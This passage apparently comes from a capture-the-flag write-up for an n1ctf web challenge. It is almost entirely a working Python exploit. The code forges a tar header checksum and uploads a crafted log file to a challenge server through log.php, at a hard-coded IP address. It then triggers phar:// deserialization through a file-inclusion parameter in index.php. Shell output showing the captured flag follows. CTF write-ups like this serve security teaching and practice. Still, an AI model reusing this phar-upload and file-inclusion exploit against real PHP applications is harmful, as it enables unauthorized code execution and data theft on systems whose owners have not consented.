    new_checksum = oct(checksum).rjust(7,'0').encode()+b'\x00'
    new_data = new_name + data[100:148] + new_checksum + data[156:]
    with open("get_flag.log", "wb") as f:
        f.write(new_data)
        f.write(b"]\n")

    # request to server..
    print("Sending exp to the server...")
    with open("get_flag.log", "rb") as f:
        requests.post("http://43.155.59.185:53340/log.php?log_type=" + generated_type, data=f.read().replace(generated_metadata, "").replace("]\n","")).text

    # getflag
    print("Getflag!")
    print(requests.get("http://43.155.59.185:53340/index.php?file=phar://log/158.101.144.10/" +generated_type + "_www.log").text)
```

Running the exploit will print the flag.

```shell
root@stypr-jpn:~/aaa/phar# python exp_make.py
Sending exp to the server...
Getflag!
download code:/download_env.zipfile exist!FLAG: n1ctf{f6ebe132457a2890285ccab4f8c834bd}
```
